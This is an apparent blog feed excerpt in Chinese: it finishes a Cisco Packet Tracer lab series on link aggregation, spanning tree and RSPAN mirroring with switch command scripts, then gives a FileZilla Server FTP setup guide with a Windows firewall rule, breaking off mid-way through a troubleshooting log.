start="4"><li><p><strong>交换机S2配置，如图13-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLANS2配置.png" alt="链路聚合与VLANS2配置"></center><center>图13-5 S2配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S2   vlan <span class="token number">2</span>   name vlan2   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span>   channel<span class="token operator">-</span><span class="token keyword">group</span> <span class="token number">1</span> mode <span class="token keyword">on</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">6</span>   channel<span class="token operator">-</span><span class="token keyword">group</span> <span class="token number">2</span> mode <span class="token keyword">on</span>   <span class="token keyword">exit</span>   port<span class="token operator">-</span>channel <span class="token keyword">load</span><span class="token operator">-</span>balance src<span class="token operator">-</span>dst<span class="token operator">-</span>mac   <span class="token keyword">int</span> port<span class="token operator">-</span>channel <span class="token number">1</span>   switchport mode trunk   <span class="token keyword">exit</span>   <span class="token keyword">int</span> port<span class="token operator">-</span>channel <span class="token number">2</span>   switchport mode trunk   <span class="token keyword">end</span></code></pre><ol start="5"><li><p><strong>交换机S3配置，如图13-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-S3配置.png" alt="链路聚合与VLAN-S3配置"></center><center>图13-6 S3配置</center></li></ol><p>   <strong>命令脚本</strong>：</p><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S3    vlan <span class="token number">2</span>   name vlan2   vlan <span class="token number">3</span>   name vlan3   <span class="token keyword">exit</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">5</span>   channel<span class="token operator">-</span><span class="token keyword">group</span> <span class="token number">2</span> mode <span class="token keyword">on</span>   <span class="token keyword">exit</span>   port<span class="token operator">-</span>channel <span class="token keyword">load</span><span class="token operator">-</span>balance src<span class="token operator">-</span>dst<span class="token operator">-</span>mac   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">int</span> port<span class="token operator">-</span>channel <span class="token number">2</span>   switchport mode trunk   <span class="token keyword">end</span></code></pre><ol start="6"><li><p><strong>终端A与终端C的连通性测试，如图13-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-终端A至终端B的连通性测试.png" alt="链路聚合与VLAN-终端A至终端B的连通性测试"></center><center>图13-7</center></li><li><p><strong>交换机S1的MAC表，如图13-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-S1的MAC表.png" alt="链路聚合与VLAN-S1的MAC表"></center><center>图13-8 S1的MAC表</center></li><li><p><strong>交换机S2的MAC表，如图13-9所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-S2的MAC表.png" alt="链路聚合与VLAN-S2的MAC表"></center><center>图13-9 S2的MAC表</center></li><li><p><strong>交换机S3的MAC表，如图13-10所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与VLAN-S3的MAC表.png" alt="链路聚合与VLAN-S3的MAC表"></center><center>图13-10 S3的MAC表</center></li></ol><h2 id="链路聚合与生成树配置实验"><a href="#链路聚合与生成树配置实验" class="headerlink" title="链路聚合与生成树配置实验"></a>链路聚合与生成树配置实验</h2><h3 id="实验内容-12"><a href="#实验内容-12" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        网络结构如图14-1所示。该网络结构具有以下两个特点：一是实现交换机之间互连的是由多条物理链路聚合而成的逻辑电路；二是交换机之间存在冗余链路，需要用生成树协议消除交换机之间的环路。</p><p>​        图14-1中的终端分配到两个不同的VLAN，其中终端A和终端C分配给VLAN2，终端B和终端D分配给VLAN3，为了实现负载均衡，基于VLAN2的生成树以交换机S2为根交换机，基于VLAN3的生成树以交换机S3为根交换机。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-网络拓扑.png" alt="链路聚合与生成树-网络拓扑"></center><center>图14-1 网络拓扑</center><h3 id="实验目的-12"><a href="#实验目的-12" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>掌握VLAN划分过程</li><li>运用生成树协议，完成具有容错和负载均衡功能的交换式以太网的设计和测试过程</li><li>运用链路聚合技术，完成具有容错功能并满足交换机之间带宽要求的交换式以太网的设计和调试过程</li></ol><h3 id="实验原理-12"><a href="#实验原理-12" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        分别在四个交换机中创建VLAN 2和VLAN 3，对于交换机S1，VLAN与端口之间映射如表14-1所示，将端口1作为接入端口分配给VLAN 2，将端口2作为接入端口分配给VLAN 3.将端口通道port-channel1和port-channel2作为被VLAN 2和VLAN 3共享的共享端口通道。其他交换机VLAN与端口之间映射分别如表14-2~表14-4所示。四个交换机端口通道与端口之间的关系如表14-5所示。将交换机S2构建基于VLAN 2的生成树时的优先级设置为最高，将交换机S3构建基于VLAN 3的生成树的优先级是个设置为最高，从而使得交换机S2和S3分别成为基于VLAN 2和VLAN 3的生成树的根交换机。</p><center>表14-1 交换机S1 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口(Access)</th><th align="center">共享端口(Trunk)</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">1</td><td align="center">port-channel1、port-channel2</td></tr><tr><td align="center">VLAN 3</td><td align="center">2</td><td align="center">port-channel1、port-channel2</td></tr></tbody></table><center>表14-2 交换机S2 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口(Access)</th><th align="center">共享端口(Trunk)</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center"></td><td align="center">port-channel1、port-channel2、port-channel3</td></tr><tr><td align="center">VLAN 3</td><td align="center"></td><td align="center">port-channel1、port-channel2、port-channel3</td></tr></tbody></table><center>表14-3 交换机S3 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口(Access)</th><th align="center">共享端口(Trunk)</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center"></td><td align="center">port-channel1、port-channel2、port-channel3</td></tr><tr><td align="center">VLAN 3</td><td align="center"></td><td align="center">port-channel1、port-channel2、port-channel3</td></tr></tbody></table><center>表14-4 交换机S4 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">接入端口(Access)</th><th align="center">共享端口(Trunk)</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">1</td><td align="center">port-channel1、port-channel2</td></tr><tr><td align="center">VLAN 3</td><td align="center">2</td><td align="center">port-channel1、port-channel2</td></tr></tbody></table><center>表14-5 端口通道配置表</center><table><thead><tr><th align="center">交换机</th><th align="center">端口通道</th><th align="center">物理端口</th></tr></thead><tbody><tr><td align="center">交换机S1</td><td align="center">port-channel1<br>port-channel2</td><td align="center">f0/3、f0/4、f0/5<br>f0/6、f0/7、f0/8</td></tr><tr><td align="center">交换机S2</td><td align="center">port-channel1<br>port-channel2<br>port-channel3</td><td align="center">f0/1、f0/2、f0/3<br>f0/4、f0/5、f0/6<br>f0/7、f0/8、f0/9</td></tr><tr><td align="center">交换机S3</td><td align="center">port-channel1<br>port-channel2<br>port-channel3</td><td align="center">f0/1、f0/2、f0/3<br>f0/4、f0/5、f0/6<br>f0/7、f0/8、f0/9</td></tr><tr><td align="center">交换机S4</td><td align="center">port-channel1<br>port-channel2</td><td align="center">f0/3、f0/4、f0/5<br>f0/6、f0/7、f0/8</td></tr></tbody></table><h3 id="实验步骤-12"><a href="#实验步骤-12" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网路拓扑，如图14-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-网络拓扑.png" alt="构建网络拓扑"></center><center>图14-2 构建网络拓扑</center></li><li><p><strong>对终端进行基本配置（IP地址、子网掩码），如图14-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-对终端A的基本配置.png" alt="链路聚合与生成树-对终端A的基本配置"></center><center>图14-3 对终端A的基本配置</center></li><li><p><strong>交换机S1配置，如图14-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-交换机S1配置.png" alt="链路聚合与生成树-交换机S1配置"></center><center>图14-4 交换机S1配置</center></li><li><p><strong>交换机S2配置，如图14-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-交换机S2配置.png" alt="链路聚合与生成树-交换机S2配置"></center><center>图14-5 交换机S2配置</center></li><li><p><strong>交换机S3配置，如图14-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-交换机S3配置.png" alt="链路聚合与生成树-交换机S3配置"></center><center>图14-6 交换机S3配置</center></li><li><p><strong>交换机S4配置，如图14-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-交换机S4配置.png" alt="链路聚合与生成树-交换机S4配置"></center><center>图14-7 交换机S4配置</center></li><li><p><strong>终端A至终端C的连通性测试，如图14-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-终端A至终端C连通性测试.png" alt="链路聚合与生成树-终端A至终端C连通性测试"></center><center>图14-8 终端A至终端C连通性测试</center></li><li><p><strong>交换机S1的MAC表，如图14-9所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-交换机S1MAC表.png" alt="链路聚合与生成树-交换机S1MAC表"></center><center>图14-9 交换机S1MAC表</center></li><li><p><strong>交换机S2的MAC表，如图14-10所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-交换机S2MAC表.png" alt="链路聚合与生成树-交换机S2MAC表"></center><center>图14-10 交换机S2MAC表</center></li><li><p><strong>交换机S3的MAC表，如图14-11所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-交换机S3MAC表.png" alt="链路聚合与生成树-交换机S3MAC表"></center><center>图14-11 交换机S3MAC表</center></li><li><p><strong>交换机S4的MAC表，如图14-12所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与生成树-交换机S4MAC表.png" alt="链路聚合与生成树-交换机S4MAC表"></center><center>图14-12 交换机S4MAC表</center></li></ol><h2 id="链路聚合与RSPAN配置实验"><a href="#链路聚合与RSPAN配置实验" class="headerlink" title="链路聚合与RSPAN配置实验"></a>链路聚合与RSPAN配置实验</h2><h3 id="实验内容-13"><a href="#实验内容-13" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        网络结构如图15-1所示。终端A和终端C属于VLAN 2，终端B和终端D属于VLAN 3，终端E和终端F属于VLAN 4.交换机S2和S3之间通过由多条物理链路聚合而成的逻辑链路进行连接。嗅探器可以嗅探终端A发送的所有ICMP报文。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与RSPAN-网络拓扑.png" alt="链路聚合与RSPAN-网络拓扑"></center><center>图15-1 网络拓扑</center><h3 id="实验目的-13"><a href="#实验目的-13" class="headerlink" title="实验目的"></a>实验目的</h3><ul><li>掌握链路聚合配置过程</li><li>了解MAC帧分算法</li><li>掌握端口通道的配置过程</li><li>掌握VLAN与链路聚合之间的相互作用过程</li><li>验证端口映射原理</li><li>验证RSPAN VLAN配置过程</li><li>验证嗅探器实现远程嗅探的过程</li><li>掌握VLAN与链路聚合之间的相互作用过程</li></ul><h3 id="实验原理-13"><a href="#实验原理-13" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        在交换机中创建VLAN，在为每一个VLAN分配端口时，不但需要建立VLAN内终端之间的传输路径，还需要建立RSPAN VLAN内终端A与嗅探器之间的传输路径，因此，三个交换机中创建的VLAN，及VLAN与端口之间映射分别入表15-1~表15-3所示。交换机端口通道与端口之间的关系入表14-4所示。</p><center>表15-1 交换机S1 VLAN与端口映射</center><table><thead><tr><th align="center">VLAN</th><th align="center">Access</th><th align="center">Trunk</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">1</td><td align="center">3</td></tr><tr><td align="center">VLAN 3</td><td align="center">2</td><td align="center">3</td></tr><tr><td align="center">VLAN 5</td><td align="center"></td><td align="center">3</td></tr></tbody></table><center>表15-2 交换机S2 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">Access</th><th align="center">Trunk</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">1</td><td align="center">4</td></tr><tr><td align="center">VLAN 3</td><td align="center">2</td><td align="center">4</td></tr><tr><td align="center">VLAN 4</td><td align="center">3</td><td align="center">port-channel 1</td></tr><tr><td align="center">VLAN 5</td><td align="center"></td><td align="center">4,port-channel 1</td></tr></tbody></table><center>表15-3 交换机S3 VLAN与端口映射表</center><table><thead><tr><th align="center">VLAN</th><th align="center">Access</th><th align="center">Trunk</th></tr></thead><tbody><tr><td align="center">VLAN 4</td><td align="center">1</td><td align="center">port-channel 1</td></tr><tr><td align="center">VLAN 5</td><td align="center"></td><td align="center">port-channel 1</td></tr></tbody></table><center>表15-4 端口通道配置表</center><table><thead><tr><th align="center">交换机</th><th align="center">端口通道</th><th align="center">物理端口</th></tr></thead><tbody><tr><td align="center">交换机S2</td><td align="center">port-channel 1</td><td align="center">f0/5,f0/6,f0/7</td></tr><tr><td align="center">交换机S3</td><td align="center">port-channel 1</td><td align="center">f0/5,f0/6,f0/7</td></tr></tbody></table><h3 id="实验步骤-13"><a href="#实验步骤-13" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按实验要求构建网络拓扑，如图15-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与RSPAN-网络拓扑.png" alt="构建网络拓扑"></center><center>图15-2 构建网络拓扑</center></li><li><p><strong>对终端设备进行基本配置（IP地址、子网掩码），如图15-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与RSPAN-对终端A进行基本配置.png" alt="链路聚合与RSPAN-对终端A进行基本配置"></center><center>图15-3 对终端A进行基本配置</center><p>其他终端也进行类似的配置</p></li><li><p><strong>对交换机S1进行配置，如图15-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与RSPAN-S1配置.png" alt="链路聚合与RSPAN-S1配置"></center><center>图15-4 S1配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S1   vlan <span class="token number">2</span>   name vlan2   vlan <span class="token number">3</span>   name vlan3   vlan <span class="token number">5</span>   name vlan5   name rspan   remote<span class="token operator">-</span>span   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode trunk    <span class="token keyword">exit</span>   <span class="token keyword">no</span> monitor <span class="token keyword">session</span> <span class="token keyword">all</span>   monitor <span class="token keyword">session</span> <span class="token number">1</span> source <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span> rx   monitor <span class="token keyword">session</span> <span class="token number">1</span> destination remote vlan <span class="token number">5</span> reflector<span class="token operator">-</span>port <span class="token number">f0</span><span class="token operator">/</span><span class="token number">17</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">17</span>   <span class="token keyword">shutdown</span>   <span class="token keyword">end</span></code></pre><ol start="4"><li><p><strong>对交换机S2进行配置，如图15-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与RSPAN-S2配置.png" alt="链路聚合与RSPAN-S2配置"></center><center>图15-5 S2配置</center><p><strong>命令脚本</strong>：</p><pre class=" language-sql"><code class="language-sql">enconf t hostname S2 vlan <span class="token number">2</span>name vlan2 vlan <span class="token number">3</span>name vlan3vlan <span class="token number">4</span>name vlan4vlan <span class="token number">5</span>name rspanremote<span class="token operator">-</span>span<span class="token keyword">exit</span><span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>switchport mode accessswitchport acces vlan <span class="token number">2</span><span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>switchport mode accessswitchport access vlan <span class="token number">3</span><span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>switchport mode accessswitchport access vlan <span class="token number">4</span><span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">5</span><span class="token operator">-</span><span class="token number">7</span>channel<span class="token operator">-</span><span class="token keyword">group</span> <span class="token number">1</span> mode <span class="token keyword">on</span><span class="token keyword">exit</span>port<span class="token operator">-</span>channel <span class="token keyword">load</span><span class="token operator">-</span>balance src<span class="token operator">-</span>dst<span class="token operator">-</span>mac<span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">4</span>switchport mode trunk<span class="token keyword">exit</span><span class="token keyword">int</span> port<span class="token operator">-</span>channel <span class="token number">1</span>switchport mode trunk<span class="token keyword">end</span></code></pre></li><li><p><strong>对交换机S3进行配置，如图15-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与RSPAN-S3配置.png" alt="链路聚合与RSPAN-S3配置"></center><center>图15-6 S3配置</center><p><strong>命令脚本</strong>：</p><pre class=" language-sql"><code class="language-sql">en conf t hostname S3 vlan <span class="token number">4</span>name vlan4vlan <span class="token number">5</span>name rspanremote<span class="token operator">-</span>span<span class="token keyword">exit</span><span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>switchport mode accessswitchport access vlan <span class="token number">4</span><span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">5</span><span class="token operator">-</span><span class="token number">7</span>channel<span class="token operator">-</span><span class="token keyword">group</span> <span class="token number">1</span> mode <span class="token keyword">on</span><span class="token keyword">exit</span>port<span class="token operator">-</span>channel <span class="token keyword">load</span><span class="token operator">-</span>balance src<span class="token operator">-</span>dst<span class="token operator">-</span>mac<span class="token keyword">int</span> port<span class="token operator">-</span>channel <span class="token number">1</span>switchport mode trunk<span class="token keyword">exit</span><span class="token keyword">no</span> monitor <span class="token keyword">session</span> <span class="token keyword">all</span>monitor <span class="token keyword">session</span> <span class="token number">1</span> source remote vlan <span class="token number">5</span>monitor <span class="token keyword">session</span> <span class="token number">1</span> destination <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span><span class="token keyword">end</span></code></pre></li><li><p><strong>终端A至终端C的ping测试，如图15-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/链路聚合与RSPAN-终端A至终端C的ping测试.png" alt="链路聚合与RSPAN-终端A至终端C的ping测试"></center><center>图15-7 终端A至终端C的ping测试</center></li><li><p><strong>终端A发出的ICMP报文，如图15-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端A发送的ICMP报文.png" alt="终端A发送的ICMP报文"></center><center>图15-8 终端A发送的ICMP报文</center></li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>脚注</strong>：</p><p>[^1]: 出自路由和交换技术实验及实训（第2版）——基于Cisco Packet Tracer</p><p><strong>参考资料</strong>：</p><ul><li>路由和交换技术实验及实训（第二版）</li><li>Packet Tracer软件使用教程深入浅出</li><li>Cisco交换机配置命令</li><li>Cisco路由器配置命令</li></ul><p><span name="Erratum"><strong>勘误</strong>：</span></p><ol><li>不同层设备之间常使用直通线连接；同层设备之间常使用交叉线连接。（交换机与交换机之间使用交叉线）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络基础 </tag>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTP服务器搭建（FileZilla Server）</title>
      <link href="/2020/09/07/ftp-fu-wu-qi-da-jian-filezillaserver/"/>
      <url>/2020/09/07/ftp-fu-wu-qi-da-jian-filezillaserver/</url>
      
        <content type="html"><![CDATA[<h1 id="FTP服务"><a href="#FTP服务" class="headerlink" title="FTP服务"></a>FTP服务</h1><p>​        FTP是用来在两台计算机之间传输文件，是Internet中应用非常广泛的服务之一。它可根据实际需要设置各用户的使用权限，同时还具有跨平台的特性，即在UNIX、Linux和Windows等操作系统中都可实现FTP客户端和服务器，相互之间可跨平台进行文件的传输。因此，FTP服务是网络中经常采用的资源共享方式之一。本问将介绍Windows下FTP服务器的搭建。</p><h1 id="FTP搭建"><a href="#FTP搭建" class="headerlink" title="FTP搭建"></a>FTP搭建</h1><p>​        Windows系统自带IIS可以使用IIS来搭建FTP服务器，但是IIS默认是不开启FTP功能的，需要用户手动开启。而且操作流程十分麻烦，下面使用FileZilla Server来搭建FTP服务器。</p><h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><ul><li>服务器：Windows Server 2008 R2</li><li>客户机：Windows 10</li><li>软件：FileZilla_Server-0_9_43.exe</li></ul><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><h3 id="0x01-FIleZillaServer安装"><a href="#0x01-FIleZillaServer安装" class="headerlink" title="0x01 FIleZillaServer安装"></a>0x01 FIleZillaServer安装</h3><ol><li><p>双击<code>FileZilla_Server-0_9_43.exe</code>程序后，会打开FileZillaServer的安装界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FileZillaServer安装界面.png" alt="FileZillaServer安装界面"></center></li><li><p>点击【I Agree】按钮后进入安装选项选择界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FileZillaServer安装选项.png" alt="FileZillaServer安装选项"></center></li><li><p>单击【Next】按钮后进入安装路径选择界面，默认安装路径显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FileZillaServer安装位置.png" alt="FileZillaServer安装位置"></center></li><li><p>单击【Next】按钮进入启动设置界面，这里将设置FileZillaServer是否以服务方式安装，这里选择第二项“作为服务，手动启动”安装，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FileZillaServer启动设置.png" alt="FileZillaServer启动设置"></center></li><li><p>点击【Next】按钮进入使用者设置界面，这是选择所有人可用，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FileZillaServer安装用户.png" alt="FileZillaServer安装用户"></center></li><li><p>点击【Install】按钮后显示程序安装过程，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FileZillaServer安装进程.png" alt="FileZillaServer安装进程"></center></li><li><p>稍等几秒钟之后，软件安装完成显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FileZillaServer安装完成.png" alt="FileZillaServer安装完成"></center></li></ol><h3 id="0x02-设置共享文件"><a href="#0x02-设置共享文件" class="headerlink" title="0x02 设置共享文件"></a>0x02 设置共享文件</h3><ol><li><p>打开<code>FileZilla Server Interface</code>图标后将显示服务连接界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FileZillaServer接口界面.png" alt="FileZillaServer接口界面"></center><p>Server Address：为服务器地址，安装在本机中服务直接使用<code>127.0.0.1</code>连接即可。</p><p>Port：指定软件监听的端口，默认为<code>14147</code>。</p></li><li><p>点击【OK】按钮进入FileZillaServer管理界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/FIleZillaServer管理界面.png" alt="FIleZillaServer管理界面"></center></li><li><p>点击菜单中的【Edit】→【User】，打开用户设置界面，在设置中添加<code>ftp_user</code>用户并为其设置密码，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/用户设置.png" alt="用户设置"></center></li><li><p>设置分享文件夹。点击【shared folders】选项，打开文件夹设置选项界面，在界面中设置共享文件夹，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/设置共享文件夹.png" alt="设置共享文件夹"></center></li></ol><h3 id="0x03一个与防火墙相关的问题"><a href="#0x03一个与防火墙相关的问题" class="headerlink" title="0x03一个与防火墙相关的问题"></a>0x03一个与防火墙相关的问题</h3><ol><li>以上操作完成之后其实就可以访问FTP服务器了，使用<code>ftp://10.10.10.132</code>访问，输入用户名和密码之后将看到FTP中的文件夹，显示内容如下图所示。</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/访问FTP文件.png" alt="访问FTP文件"></center><p>但有时可能会出现如下图中显示的错误信息。</p>   <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/与服务器建立连接失败.png" alt="与服务器建立连接失败"></center><p>   这种错误一般都是由于防火墙引起的，有些人会推荐关闭防火墙以来访问FTP服务器，但是博主不建议这种做法，因为<font color="red">不安全</font>。这里推荐设置一条访问策略来解决防火墙的过滤问题。</p><p><a name="setfirewall"></a></p><h3 id="0x04-设置防火策略"><a href="#0x04-设置防火策略" class="headerlink" title="0x04 设置防火策略"></a>0x04 设置防火策略</h3><ol><li><p>添加访问策略。使用管理员权限打开cmd，并运行如下命令，操作结果如下图所示。</p><pre class=" language-powershell"><code class="language-powershell">netsh advfirewall firewall add rule name=FTP <span class="token function">dir</span>=in action=allow protocol=tcp localport=21<span class="token punctuation">,</span>50000<span class="token operator">-</span>60000 </code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/添加访问策略.png" alt="添加访问策略"></center></li><li><p>设置被动连接。点击【Edit】→【Setting】→【Passive mode setting】选项，将端口范围设置为：<code>5000-6000</code>，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/设置FTP为被动模式.png" alt="设置FTP为被动模式"></center></li></ol><h3 id="0x05-连接测试"><a href="#0x05-连接测试" class="headerlink" title="0x05 连接测试"></a>0x05 连接测试</h3><ol><li><p>客户端连接测试。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FileZillaServer/连接测试.png" alt="连接测试"></center></li></ol><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li><strong>权限问题</strong>。在创建FTP用户时需要指定该用户对执行FTP共享目录的操作权限。例如：用户想要删除该目录下的文件时就需要拥有<strong>删除权限，</strong>否则操作不会成功。</li><li><strong>端口问题</strong>。FTP服务默认使用21端口，因此想要连接成功就需要确保21端口开放，这一点对云服务上的操作这是必要操作。</li></ul><h1 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h1><h2 id="0x01-服务器发回了不可路由的地址。使用服务器地址代替"><a href="#0x01-服务器发回了不可路由的地址。使用服务器地址代替" class="headerlink" title="0x01 服务器发回了不可路由的地址。使用服务器地址代替"></a>0x01 服务器发回了不可路由的地址。使用服务器地址代替</h2><p>错误描述：</p><pre class=" language-sql"><code class="language-sql">命令:  PASV响应:  <span class="token number">227</span> Entering Passive Mode 状态:  服务器发回了不可路由的地址。使用服务器地址代替。命令:  LIST错误:  连接超时错误: 